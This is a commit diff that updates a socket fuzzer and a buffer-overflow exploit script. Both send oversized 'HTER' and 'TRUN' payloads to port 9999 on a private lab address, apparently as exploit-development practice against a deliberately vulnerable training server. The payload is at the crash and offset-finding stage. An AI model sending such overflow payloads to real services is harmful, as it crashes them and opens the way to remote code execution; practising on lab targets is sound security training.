67d3b513e79bdf86e3d92fb2414ab33f2cf98dcd
sayseven7 <say_seven@protonmail.com>
2026-04-20 18:25:23 -0300

    Update connection IPs and payloads in fuzzing and exploit scripts

--- fuzzing.py
+++ fuzzing.py
@@ -12,6 +12,6 @@ while len(lista) <= 3000:
 for i in lista:
     print("Enviando payload con " + str(len(i)) + " bytes") 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("192.168.100.129", 9999))
+    s.connect(("192.168.100.131", 9999))
     s.recv(1024)
     s.send(("HTER " + i + "\r\n").encode())
--- xpl.py
+++ xpl.py
@@ -1,14 +1,14 @@
 #!/usr/bin/python3
 
 import socket
-
-payload = "A" * 2027 + "B" * 14 + "C" * 4 + "D" * 4
+#2003
+payload = "A" * 2003 + "B" * 2 + "C" * 2
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.100.129", 9999))
+s.connect(("192.168.100.131", 9999))
 recv = s.recv(1024)
 print(recv.decode())
-s.send(("HTER " + payload + "\r\n").encode())
+s.send(("TRUN /.:/" + payload + "\r\n").encode())
 r = s.recv(1024)
 print(r.decode())
 s.close()
